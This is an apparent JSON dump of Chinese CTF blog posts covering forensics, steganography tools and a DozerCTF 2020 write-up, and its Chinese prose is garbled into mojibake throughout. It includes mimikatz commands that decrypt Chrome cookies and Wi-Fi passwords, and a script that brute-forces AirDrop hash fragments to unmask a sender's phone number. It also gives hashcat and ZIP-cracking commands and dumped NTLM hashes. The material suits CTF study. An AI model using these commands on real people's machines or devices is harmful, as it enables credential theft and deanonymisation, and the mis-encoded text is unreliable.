ä¿å­˜/ä½¿ç”¨ä¸»å¯†é’¥ï¼ˆmaster keysï¼‰ï¼š dpapi::cache /save /file:cache.bin æå–WiFiå¯†ç ï¼š dpapi::wifi /in:&quot;&#123;fullpath&#125;\\file.xml&quot; â€‹ Cookieså·¥å…·ï¼šmimikatz ä¿å­˜/ä½¿ç”¨ä¸»å¯†é’¥ï¼ˆmaster keysï¼‰ï¼š Windows ä¸‹ï¼šæ–‡ä»¶å¤¹é€‰é¡¹ -&gt; æŸ¥çœ‹ -&gt; å–æ¶ˆå‹¾é€‰ â€œéšè—å—ä¿æŠ¤çš„æ“ä½œç³»ç»Ÿæ–‡ä»¶â€ æ‰èƒ½çœ‹åˆ° SID æ–‡ä»¶å¤¹ä¸‹çš„ protect æ–‡ä»¶ dpapi::masterkey /in:S-1-5-21-262715442-3761430816-2198621988-1001\\57935170- beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:&lt;ç™»å½•å¯†ç &gt; è§£å¯†Cookiesï¼š dpapi::chrome /in:&quot;Cookies&quot; â€‹ AirDropAirDropæœ‰ä¸€ä¸ªå®‰å…¨æ¼æ´å°†å‘é€è€…çš„Apple IDå’Œç”µè¯å·ç çš„å“ˆå¸Œå€¼æ³„éœ²ç»™æ¥æ”¶è€…è®¾å¤‡ã€‚åœ¨AirDropè¿æ¥æˆ–æ–‡ä»¶ä¼ è¾“ä¹‹å‰ï¼Œå‘é€è®¾å¤‡çš„Apple IDå’Œç”µè¯å·ç çš„SHA-256å“ˆå¸Œå€¼ä¼šå¹¿æ’­ç»™æ‰€æœ‰é‚»è¿‘çš„è®¾å¤‡ã€‚æ‰€ä»¥åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å¯ä»¥æ•è·è¯¥è‹¹æœIDå’Œç”µè¯å·ç çš„éƒ¨åˆ†SHA-256å“ˆå¸Œå€¼ï¼Œçˆ†ç ´å‡ºå®Œæ•´çš„ä¿¡æ¯ä»¥æ­¤æ¥è¯†åˆ«å‘é€è®¾å¤‡ã€‚ å…³é”®æ–‡ä»¶ï¼šsysdiagnose/system_logs.archive AirDrop AWDLæ•°æ®å­˜å‚¨åœ¨æ—¥å¿—å†…çš„sharingdè¿›ç¨‹ä¸‹ï¼Œå› æ­¤å¯ä»¥æ·»åŠ è¿‡æ»¤æ¡ä»¶åªæ˜¾ç¤ºsharingdè¿›ç¨‹å’ŒHashesçš„æ•°æ®ã€‚ æŠ•é€’è®¾å¤‡çš„éƒ¨åˆ†Hashæ•°æ®ï¼ˆå‰äº”ä½â€¦åäº”ä½ï¼‰ï¼Œå¯ä»¥å†™è„šæœ¬çˆ†ç ´å›½å†…è¿è¥å•†æ‰€æœ‰æ‰‹æœºå·çš„å·æ®µï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ‰‹æœºå·å‰é¢è¦åŠ ä¸Šä¸­å›½çš„æ‰‹æœºå·å‰ç¼€86ã€‚ 1234567891011121314151617181920212223242526272829import hashlibtargetstart = input(&#x27;[+] Enter the target hash start fragment: &#x27;)targetend = input(&#x27;[+] Enter the target hash end fragment: &#x27;)print(&#x27;[+] Checking all Chinese areacode&#x27;)areacodelist = [&#x27;139&#x27;, &#x27;138&#x27;, &#x27;137&#x27;, &#x27;136&#x27;, &#x27;135&#x27;, &#x27;134&#x27;, &#x27;159&#x27;, &#x27;158&#x27;, &#x27;157&#x27;,&#x27;150&#x27;,&#x27;151&#x27;, &#x27;152&#x27;, &#x27;188&#x27;, &#x27;187&#x27;, &#x27;182&#x27;, &#x27;183&#x27;, &#x27;184&#x27;, &#x27;178&#x27;]phonematch = []for areacode in areacodelist: line = &#x27;0&#x27; print(&#x27;[+] Searching area code &#x27; + areacode + &#x27; for target...&#x27;) while int(line) &lt; 10000000: targetphone = &#x27;86&#x27; + str(areacode) + str(line).zfill(8) targettest = hashlib.sha256(targetphone.encode()) starthashcheck = targettest.hexdigest() [0:5] endhashcheck = targettest.hexdigest() [-5:] if starthashcheck == targetstart.lower() and endhashcheck == targetend.lower(): print(targetphone + &#x27; matches hash fragments. Still checking...&#x27;) phonematch.append(targetphone) line = int(line) + 1 while int(line) == 10000000: break if phonematch: print(&#x27;Your target\\&#x27;s phone number may be:&#x27;) for match in phonematch: print(match)else: print(&#x27;Target phone number not found in this area code set. Target phone may use another country code.&#x27;)","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"å–è¯","slug":"å–è¯","permalink":"https://lazzzaro.github.io/tags/%E5%8F%96%E8%AF%81/"}],"author":"Lazzaro"},{"title":"æ–‡ä»¶éšå†™","slug":"misc-æ–‡ä»¶éšå†™","date":"2020-06-19T17:48:22.000Z","updated":"2023-11-08T17:17:52.237Z","comments":true,"path":"2020/06/20/misc-æ–‡ä»¶éšå†™/","permalink":"https://lazzzaro.github.io/2020/06/20/misc-%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99/","excerpt":"","text":"æ–‡ä»¶éšå†™ï¼ˆSteganographyï¼‰æ–‡ä»¶å¤´ï¼šList of file signatures å›¾ç‰‡ç±» é€šç”¨ å›¾ç§ï¼ˆbinwalkã€foremostã€æŸå‹ç¼©è½¯ä»¶ï¼‰ LSB stegsolve.jar å®‰è£…ï¼šhttp://www.caesum.com/handbook/Stegsolve.jar lsb.py å®‰è£…ï¼šhttps://github.com/livz/cloacked-pixel å‘½ä»¤ï¼š(python2) lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt; stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.jpg] [wordlist.txt] openstego https://www.openstego.com/ ç›²æ°´å°ï¼ˆåŒå›¾ï¼‰ https://github.com/chishaxie/BlindWaterMark å‘½ä»¤ï¼špython bwm.py decode hui.png hui_with_wm.png wm_from_hui.png https://github.com/linyacool/blind-watermark å‘½ä»¤ï¼špython decode.py --original ori.png --image res.png --result extract.png Javaç›²æ°´å° https://github.com/ww23/BlindWatermark å‘½ä»¤ï¼šjava -jar BlindWatermark.jar decode -c img-ec.jpg img-dc.jpg éšå½¢æ°´å°ï¼ˆå¾çˆ±ç ´è§£WaterMarkéšå½¢æ°´å°å·¥å…·ï¼‰ NTFSï¼ˆæŸå‹ç¼©è½¯ä»¶ã€NtfsStreamsEditorï¼‰ Our Secretï¼ˆæ–‡æ¡£åŠ å¯†ï¼‰ Steganography https://www.hyluz.cn/zb_users/upload/2021/02/202102201613815645350310.zip æ–‡ä»¶å°¾æ ‡å¿—ï¼šl&lt;9l0kl10n88j:8&lt; å‚è€ƒï¼šhttps://www.hyluz.cn/?id=208 PixelJihadï¼ˆJSåŠ å¯†ï¼‰ https://github.com/oakes/PixelJihad http://tools.jb51.net/aideddesign/img_add_info Steganography.jsï¼ˆJSåŠ å¯†ï¼‰ https://www.peter-eigenschink.at/projects/steganographyjs/showcase/ DeEgger Embedder bftools å‘½ä»¤ï¼š bftools decode braincopter 1.png &gt; 1.txt bftools run 1.txt pngæ–‡ä»¶å¤´ï¼š89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 æ–‡ä»¶å°¾ï¼š00 00 00 00 49 45 4E 44 AE 42 60 82 zsteg https://github.com/zed-0xff/zsteg å‘½ä»¤ï¼š zsteg -a xxx.png zsteg -E &quot;[Pattern]&quot; xxx.png &gt; out.xxx LSBï¼ˆå¸¦å¯†ç ï¼Œå¼±å£ä»¤123456ï¼‰ https://github.com/livz/cloacked-pixel https://github.com/fjh1997/cloacked-pixel stegpy å®‰è£…ï¼špip install stegpy å‘½ä»¤ï¼šstegpy xx.webp (-p) jpg / jpegæ–‡ä»¶å¤´ï¼šFF D8 FF æ–‡ä»¶å°¾ï¼šFF D9 steghide http://steghide.sourceforge.net/ å‘½ä»¤ï¼šsteghide extract -sf 1.jpg ï¼ˆéœ€å¯†ç  æˆ– ç©ºå¯†ç ï¼‰ å¯†ç çˆ†ç ´ï¼š stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.jpg] [wordlist.txt] StegCrackerï¼ˆçˆ†ç ´ï¼‰ https://github.com/Paradoxis/StegCracker å‘½ä»¤ï¼šstegcracker &lt;file&gt; [&lt;wordlist&gt;] jsteg https://github.com/lukechampine/jsteg F5 https://github.com/matthewgao/F5-steganography å‘½ä»¤ï¼šjava Extract 123456.jpg -p 123456 outguess https://github.com/crorvick/outguess å‘½ä»¤ï¼šoutguess -r file.jpg -k password -t out.txt JPHS https://www.scanwith.com/JPHS_for_Windows_download.htm bmp zsteg https://github.com/zed-0xff/zsteg å‘½ä»¤ï¼š zsteg -a xxx.bmp zsteg -E &quot;[Pattern]&quot; xxx.bmp &gt; out.xxx wbStego wbstego43openï¼šhttp://wbstego.wbailer.com/ stegpy å®‰è£…ï¼špip install stegpy å‘½ä»¤ï¼šstegpy xx.webp (-p) gifæ–‡ä»¶å¤´ï¼š47 49 46 38ï¼ˆGIF87a æˆ– GIF89aï¼‰ åˆ†å¸§ï¼ˆNamoGIFï¼‰ æ—¶é—´è½´ï¼ˆæ¯ä¸€å¸§é—´çš„æ—¶é—´é—´éš”ï¼‰ identify -format &quot;%s %T \\n&quot; 100.gif stegpy å®‰è£…ï¼špip install stegpy å‘½ä»¤ï¼šstegpy xx.webp (-p) ç›¸åŒå›¾åƒæ¯”å¯¹ webp stegpy å®‰è£…ï¼špip install stegpy å‘½ä»¤ï¼šstegpy xx.webp (-p) å…¶ä»–åœ¨çº¿å·¥å…·StegOnline åœ¨çº¿å›¾ç‰‡æ·»åŠ /è§£å¯†éšè—ä¿¡æ¯(éšå†™æœ¯)å·¥å…· Magic Eye Solver / Viewer Aperiâ€™Solve npiet éŸ³é¢‘ç±» é€šç”¨ Audacityï¼ˆæ³¢å½¢ã€é¢‘è°±ï¼‰ DeEgger Embedder mp3 mp3stego https://www.petitcolas.net/steganography/mp3stego/ å‘½ä»¤ï¼šdecode -X -P pass svega_stego.mp3 MP3 Steno å¸§å¤´private_bit å‚è€ƒï¼š æŸå·¥æ§ CTF çº¿ä¸Šèµ›éšä¿¡é“æ•°æ®å®‰å…¨åˆ†æé¢˜è§£ De1CTF mc_easybgm wavæ–‡ä»¶å¤´ï¼š52 49 46 46 EE AD 25 03 57 41 56 45 66 6D 74 20 steghide http://steghide.sourceforge.net/ å‘½ä»¤ï¼šsteghide extract -sf 1.wav ï¼ˆéœ€å¯†ç  æˆ– ç©ºå¯†ç ï¼‰ å¯†ç çˆ†ç ´ï¼š stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.wav] [wordlist.txt] LSB Silenteye: https://silenteye.v1kings.io/ è„šæœ¬ï¼š https://github.com/sniperline047/Audio-Steganography SSTV æ…¢æ‰«æç”µè§†ï¼ˆSlow-scan televisionï¼‰æ˜¯ä¸šä½™æ— çº¿ç”µçˆ±å¥½è€…çš„ä¸€ç§ä¸»è¦å›¾ç‰‡ä¼ è¾“æ–¹æ³•ï¼Œæ…¢æ‰«æç”µè§†é€šè¿‡æ— çº¿ç”µä¼ è¾“å’Œæ¥æ”¶å•è‰²æˆ–å½©è‰²é™æ€å›¾ç‰‡ã€‚ å·¥å…·ï¼š https://github.com/colaclanth/sstv å‘½ä»¤ï¼šsstv -d audio_file.wav -o result.png æ‰‹æœºApp - Robot36ï¼ˆéŸ³é¢‘â†’å›¾ç‰‡ï¼‰ QSSTV DeepSound stegpy å®‰è£…ï¼špip install stegpy å‘½ä»¤ï¼šstegpy xx.webp (-p) mid Velato http://velato.net/ å…¶ä»–åœ¨çº¿å·¥å…·Morse Code Adaptive Audio Decoder Reverse Audio Online è§†é¢‘ç±» é€šç”¨ MSU StegoVideo / VirtualDub+æ’ä»¶ https://zhaokaifeng.com/?p=1305 å‹ç¼©åŒ…ç±» zipæ–‡ä»¶å¤´ï¼š50 4B 03 04ï¼ˆPKï¼‰ ä¼ªåŠ å¯†ï¼ˆæŸå‹ç¼©è½¯ä»¶ï¼‰ å¯†ç çˆ†ç ´ï¼ˆARCHPRï¼‰ æ˜æ–‡æ”»å‡»å·¥å…· bkcrack / rbkcrack æ”»å‡»ï¼š 12345678rbkcrack -C xxx.zip -c xxx.png -p yyy.png-C è¦æ”»å‡»çš„å‹ç¼©åŒ…-c è¦æ”»å‡»çš„å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶-p åˆšåˆ›å»ºçš„æ˜æ–‡æ–‡ä»¶å*éƒ¨åˆ†ä½ç½®å·²çŸ¥æ˜æ–‡ï¼šbkcrack -C flag.zip -c flag.txt -p plain.txt -x 16 2d -x 21 2d -x 26 2d -x 31 2d -x 44 7d å¾—åˆ°ä¸‰ä¸ªkeyè§£ç ï¼š 123456rbkcrack -C xxx.zip -c xxx.png -k be056038 0a143c0c 1ea08ca5 -d xxx.png-C è¦æ”»å‡»çš„å‹ç¼©åŒ…-c è¦æ”»å‡»çš„å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶-k åˆšç”Ÿæˆçš„ä¸‰ä¸ªkey-d æœ€ç»ˆè¿˜åŸçš„æ–‡ä»¶å raræ–‡ä»¶å¤´ï¼š52 61 72 21ï¼ˆRar!ï¼‰ å‚è€ƒï¼šhttps://blog.csdn.net/Claming_D/article/details/105899397 ä¼ªåŠ å¯† æŸ¥çœ‹ç¬¬24ä¸ª16è¿›åˆ¶æ•°åé¢çš„æ•°æ˜¯0è¿˜æ˜¯4ï¼Œæ˜¯4è¡¨ç¤ºè¿›è¡Œäº†ä¼ªåŠ å¯†ï¼Œå°†4æ”¹ä¸º0å°±å¯ä»¥è§£é™¤ä¼ªåŠ å¯†ï¼ˆä¿®æ”¹å¯¹åº”RarBlockçš„CRCå€¼ï¼‰ã€‚ çˆ†ç ´å·¥å…· hashcat 1234567891011121314151617è·å¾—hashå€¼rar2john xxx.rar &gt; rar.hashçˆ†ç ´hashcat -m 12500 -a 3 $RAR3$*0*a4243df9ba2d6023*b84a539412288864a2d6a9bfdcf2dd97 ?d?d?d?d?d?d -o out.txthashcat -m 13000 -a 3 $RAR5$*0*a4243df9ba2d6023*b84a539412288864a2d6a9bfdcf2dd97 ?d?d?d?d?d?d -o out.txt-m æ ¹æ®rarç±»å‹è¿›è¡Œé€‰æ‹©ï¼Œhashcatå®˜æ–¹æä¾›çš„å‚æ•°æœ‰ä¸¤ç§ï¼ŒRAR3-hpç±»å‹ä¸º12500ï¼ŒRAR5ç±»å‹ä¸º13000-a 3 ä¸ºæ©ç æ–¹å¼ç ´è§£ï¼Œæ©ç æ ¼å¼å¦‚ä¸‹ ?d?d?d?d?d?d è¡¨ç¤ºä¸º6ä½æ•°å­—å†…ç½®çš„æ©ç è§„åˆ™æœ‰ï¼š?l ï¼šè¡¨ç¤ºå°å†™å­—æ¯?u ï¼šè¡¨ç¤ºå¤§å†™å­—æ¯?d ï¼šè¡¨ç¤ºæ•°å­—?s ï¼šè¡¨ç¤ºç‰¹æ®Šå­—ç¬¦?a ï¼šè¡¨ç¤ºä¸Šé¢å››ç§çš„å¹¶é›†-o out.txtæ˜¯è¾“å‡ºç»“æœ æ–‡æœ¬ç±» txt é›¶å®½ whitespace snowéšå†™ http://fog.misty.com/perry/ccs/snow/snow/snow.html snow -C -p password filename word è§£å‹ wordé€‰é¡¹-æ˜¾ç¤º-éšè—æ–‡å­—-å‹¾é€‰ è§£å¯† æå–hashå€¼ï¼špython3 office2john.py 1.docx &gt; hash.txt hashcatç ´è§£ï¼šhashcat -m 9400 --username hash.txt -a 3 ?d?d?d?d?d?d?d?d -o cracked_pass.txt excel è§£å‹ pdf wbStego4open http://wbstego.wbailer.com/ å¯†ç çˆ†ç ´ pdfcrack pyc / pyo stegosaurusï¼ˆå­—èŠ‚ç ï¼‰ https://github.com/AngelKitty/stegosaurus å‘½ä»¤ï¼š python3 -m stegosaurus main.pyc -x å¸¸ç”¨è„šæœ¬å›¾ç‰‡å¤„ç† CRCå®½é«˜çˆ†ç ´ï¼ˆpngï¼‰123456789101112131415161718192021222324252627import binasciiimport structimport sysfr = open(&#x27;flag.png&#x27;,&#x27;rb&#x27;).read()data = bytearray(fr[0x0c:0x1d])crc32key = eval(&#x27;0x&#x27;+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])n = 4095for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(&#x27;flag2.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close sys.exit() å¿«é€Ÿå‚…é‡Œå¶å˜æ¢ï¼ˆFFTï¼‰1234567891011121314import cv2 as cvimport numpy as npimport matplotlib.pyplot as pltimg = cv.imread(&#x27;FFT.png&#x27;, 0) #è¯»ä¸ºç°åº¦å›¾åƒf = np.fft.fft2(img) #åšé¢‘ç‡å˜æ¢fshift = np.fft.fftshift(f) #è½¬ç§»åƒç´ åšå¹…åº¦è°±s1 = np.log(np.abs(fshift))#å–ç»å¯¹å€¼ï¼šå°†å¤æ•°å˜åŒ–æˆå®æ•°å–å¯¹æ•°çš„ç›®çš„ä¸ºäº†å°†æ•°æ®å˜åŒ–åˆ°0-255plt.subplot(121)plt.imshow(img, &#x27;gray&#x27;)plt.title(&#x27;original&#x27;)plt.subplot(122)plt.imshow(s1,&#x27;gray&#x27;)plt.title(&#x27;center&#x27;)plt.show() â€‹ å‹ç¼©åŒ…å¤„ç† éå†zipå‹ç¼©åŒ…12345678910111213141516import os.pathimport zipfileimport redir_path=&#x27;xxxxxxxx&#x27;files= os.listdir(dir_path)newfiles = files[::-1]print(newfiles)setee = []for file in newfiles: #éå†æ–‡ä»¶å¤¹ position = dir_path+&#x27;\\\\&#x27;+ file #æ„é€ ç»å¯¹è·¯å¾„ï¼Œ&quot;\\\\&quot;ï¼Œå…¶ä¸­ä¸€ä¸ª&#x27;\\&#x27;ä¸ºè½¬ä¹‰ç¬¦ print (position) z = zipfile.ZipFile(position, &#x27;r&#x27;) for filename in z.namelist(): bytes = z.read(filename) if b&#x27;Zmxh&#x27; in bytes: print(filename) zlibè§£å‹å­—ç¬¦ä¸²123456import zlibdata = open(&quot;zlib_hex_data.txt&quot;, &#x27;r&#x27;, encoding=&quot;utf-8&quot;).read().replace(&quot; &quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;).strip()data_dec = zlib.decompress(bytes.fromhex(data))print(data_dec[:100])with open(&quot;zlib_data.rar&quot;, &#x27;wb&#x27;) as wf: wf.write(data_dec) å…¶ä»–åœ¨çº¿å·¥å…·wordle å¡«å­—ï¼šhttps://www.wsolver.com/ sokudo æ•°ç‹¬ï¼šhttps://shudu.gwalker.cn/ virustotal æ–‡ä»¶æ£€æµ‹ï¼šhttps://www.virustotal.com/gui/home/upload Tupperè‡ªæŒ‡å…¬å¼ï¼šhttps://tuppers-formula.ovh/ base-decode ä»»æ„baseè§£ç ï¼šhttps://basecrack.herokuapp.com/ brainfuckåˆ†æï¼šhttp://pablojorge.github.io/brainfuck/ é‡‘ç¬›çŸ­ä¿¡PDUç¼–ç è§£ç å·¥å…·ï¼šhttp://www.sendsms.cn/pdu/","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"éšå†™","slug":"éšå†™","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"},{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"}],"author":"Lazzaro"},{"title":"DozerCTF 2020","slug":"match-DozerCTF-2020","date":"2020-06-14T13:00:00.000Z","updated":"2020-06-26T10:47:09.519Z","comments":true,"path":"2020/06/14/match-DozerCTF-2020/","permalink":"https://lazzzaro.github.io/2020/06/14/match-DozerCTF-2020/","excerpt":"","text":"CRYPTOçœŸÂ·ç­¾åˆ° è¿™æ˜¯çœŸçš„ç­¾åˆ°é¢˜ é™„ä»¶ï¼šbaby_base.exe æŸ¥çœ‹æ–‡æœ¬ï¼ŒBase64+Base32+Hex+Base58 è§£ç å¾—flagã€‚ â€‹ easy_bag è¿™è«éå°±æ˜¯ä¼ è¯´ä¸­çš„çµå¼‚èƒŒåŒ…ï¼Ÿ nc 118.31.11.216 30003 æç¤ºå¾ˆæ˜æ˜¾ï¼ŒèƒŒåŒ…å¯†ç ã€‚ ncå–å¾—å…¬é’¥ä¸å¯†æ–‡ï¼Œä¿®æ”¹å‚è€ƒè„šæœ¬åSageè¿è¡Œå¾—flagï¼š 1234567891011121314151617181920212223242526272829303132333435###Sage###import binasciipubKey = [] #å…¬é’¥pubKey = pubKey.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)encoded = #å¯†æ–‡encoded = encoded.replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print i, M M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] M = hex(int(M, 2))[2:-1] print(bytes.fromhex(M)) â€‹ REVERSEè²Œä¼¼æœ‰äº›ä¸å¯¹ è¿™æ˜¯è°çš„è¯¾ç¨‹è®¾è®¡ï¼Ÿåšçš„å¥½çƒ‚ï¼ é™„ä»¶ï¼šCipher.exe IDAæŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç° OEG7U19kUvCsV29qzT9qcUm0yDCwy2CiWjOrU2Or åŠ ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/ï¼ŒçŒœæµ‹ä¸ºè‡ªå®šä¹‰ç è¡¨çš„Base64ç¼–ç ã€‚ CyberChefè§£ç å¾— Dr&#123;__g_!ocomiom&#125;ztlasoaefdn_dnã€‚ æ ¹æ®æœ€ç»ˆflagæ ¼å¼ Dozerctf&#123;xxx&#125;ï¼Œå¯¹æ¯”å°è¯•ç”¨æ …æ å¯†ç è§£å¯†ï¼š Dr&#123;__g_! ocomiom&#125; ztlasoa efdn_dn æŒ‰ä¸Šä¸‹é¡ºåºå–å‡ºæ‹¼æ¥å¾—åˆ°flagã€‚ â€‹ MISCupload where is the fileï¼Ÿï¼ˆflagæ ¼å¼Dozerctf{XXXXXXXXXXXXXXX}ï¼‰ é“¾æ¥ï¼šhttps://share.weiyun.com/frfkQQvq å¯†ç ï¼šrkbpx2 wiresharkæ‰“å¼€pcapæµé‡åŒ…ï¼Œæ–‡ä»¶â†’å¯¼å‡ºå¯¹è±¡â†’HTTPï¼Œå‘ç°flag.jpgæ–‡ä»¶ã€‚ ä¿å­˜åˆ°æœ¬åœ°ï¼Œç”¨010editoræŸ¥çœ‹æ–‡ä»¶å¤´504B0304ä¸ºzipå‹ç¼©æ–‡ä»¶æ ¼å¼ã€‚ ä¿®æ”¹æ–‡ä»¶åflag.zipï¼Œæ‰“å¼€å‘ç°éœ€è¦å¯†ç ï¼Œå…¶ä¸­çš„5ä¸ªtxtæ–‡ä»¶å‡ä¸º6å­—èŠ‚å¤§å°ã€‚ ç”¨6å­—èŠ‚CRCç¢°æ’è„šæœ¬åˆ†åˆ«çˆ†ç ´5ä¸ªæ–‡ä»¶CRCå€¼ï¼Œé€‰å–æœ‰å«ä¹‰çš„çˆ†ç ´å€¼ä¸ºæ¯ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ‹¼æ¥å¾—flagã€‚ â€‹ pyå—ï¼Ÿ é“¾æ¥ï¼šhttps://share.weiyun.com/btEdYZcA å¯†ç ï¼šssihnd pngå›¾ï¼ŒLSBä½ä½éšå†™ï¼ŒStegsolveæå–å‡ºä¸€ä¸²å­—ç¬¦ä¸²ï¼ŒBase64è§£ç å‡ºflagã€‚ â€‹ å¤æ—¥è®¡åˆ’ æ¬¢è¿æ¥åˆ°å¤æ—¥è®¡åˆ’ï¼Œenjoy the game é“¾æ¥ï¼šhttps://share.weiyun.com/MUdUEP0h å¯†ç ï¼štwfn5u 010editoræŸ¥çœ‹ä¸‹è½½æ–‡ä»¶çš„æ–‡ä»¶å¤´Rarï¼Œä¸ºraræ–‡ä»¶æ ¼å¼ã€‚ 360å‹ç¼©æ‰“å¼€å‹ç¼©åŒ…ï¼Œå‘ç°important.txt:secret.rarï¼Œä¸ºNTFSéšå†™ï¼Œæå–å‡ºsecret.rarã€‚ å°è¯•æ‰“å¼€secret.rarå‘ç°æœ‰é”™è¯¯ï¼Œä½¿ç”¨WinRARä¿®å¤å‹ç¼©åŒ…ï¼Œå¾—åˆ°secret1/secret2/secret3/secret4å››ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€å‘ç°æ¯è¡Œä¸¤ä¸ªæ•°ï¼Œæ˜“çŸ¥ä¸ºåæ ‡ã€‚ æ‹¼æ¥å››ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨gnuplotç”»å›¾å·¥å…·ï¼Œplotç”»å›¾å‘½ä»¤å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ï¼Œæœ‰ç½‘é¼æ¯ç»éªŒä¸éš¾çŸ¥ä¸ºæ±‰ä¿¡ç ï¼Œä½†è¢«åè‰²å¤„ç†è¿‡ã€‚ åè‰²ä¸ä¿®å¤å¤„ç†å¾—åˆ°æ±‰ä¿¡ç ï¼Œç”¨æä¸ç¨³å®šåœ¨çº¿è¯†åˆ«å™¨http://www.efittech.com/hxdec.html è§£ç å¾—flagã€‚ â€‹ easy_analysis Can you find the secret from her/his computer? é“¾æ¥ï¼šhttps://share.weiyun.com/lAcsmVU6 å¯†ç ï¼šxqrxwg å†…å­˜å–è¯ï¼Œä¸Švolatilityå·¥å…·åˆ†æä¸€æ³¢ï¼Œæ¯ç§ä½¿ç”¨æƒ…å†µéƒ½æŸ¥çœ‹ä¸€éã€‚ æŸ¥çœ‹profileå€¼ï¼š volatility -f memory imageinfo å¾—åˆ°profileå€¼ä¸ºWin7SP1x64ã€‚ æŒ‰å…³é”®å­—æ‰«ææ–‡ä»¶ï¼š volatility -f memory --profile=Win7SP1x64 filescan | grep &quot;flag&quot; ç»“æœï¼š 0x000000001e2fa940 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e314f20 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e76e070 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e85f430 2 0 RW---- \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag\\analys å°è¯•å¯¼å‡ºanalysæ–‡ä»¶ï¼š volatility -f memory --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000001e85f430 010editoræŸ¥çœ‹ä¸ºzipæ–‡ä»¶ï¼Œæ”¹æ–‡ä»¶åæ‰“å¼€ï¼ŒåŠ å¯†ï¼Œæœ‰æç¤ºï¼š Why you donâ€™t know my password? Itâ€™s so easy. Maybe you can log in to my computer. çŒœæµ‹ä¸ç™»å½•ä¿¡æ¯æœ‰å…³ã€‚ æå–ç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼ŒæŸ¥çœ‹password hashï¼š volatility -f memory --profile=Win7SP1x64 hivelist ï¼ˆåˆ—ä¸¾ç¼“å­˜åœ¨å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ï¼‰ volatility -f memory --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010 -D ./ ï¼ˆæå–æ³¨å†Œè¡¨systemå’ŒSAMè™šæ‹Ÿåœ°å€çš„hashå†…å®¹ï¼‰ ç»“æœï¼š Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::13m0nade:1000:aad3b435b51404eeaad3b435b51404ee:575f5313970908467a19d3a5aa269743::: å°è¯•åœ¨çº¿md5è§£å¯† 31d6cfe0d16ae931b73c59d7e0c089c0 å’Œ 575f5313970908467a19d3a5aa269743ï¼š 31d6cfe0d16ae931b73c59d7e0c089c0 â†’ [ç©ºå¯†ç ] 575f5313970908467a19d3a5aa269743 â†’ AaBbCc123 ç”¨AaBbCc123è§£å¯†zipæ–‡ä»¶æˆåŠŸï¼Œå¾—åˆ°flag.zipå’Œusb.pcapã€‚ flag.zipï¼ŒåŠ å¯†ï¼Œæœ‰æç¤ºï¼š å¯†ç å¾ˆé•¿ï¼Œå­—æ¯å…¨éƒ¨å°å†™ wiresharkæ‰“å¼€usb.pcapï¼Œæ˜“çŸ¥ä¸ºusbæµé‡ï¼Œå…ˆç”¨tsharkå·¥å…·å¾—åˆ°leftover capture dataï¼š tshark -r usb.pcap -T fields -e usb.capdata å†ç”¨ä»¥ä¸‹è„šæœ¬æˆ–UsbKeyboardDataHackerè„šæœ¬æ¢å¤å‡»é”®ä¿¡æ¯ï¼š 123456789101112131415161718mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 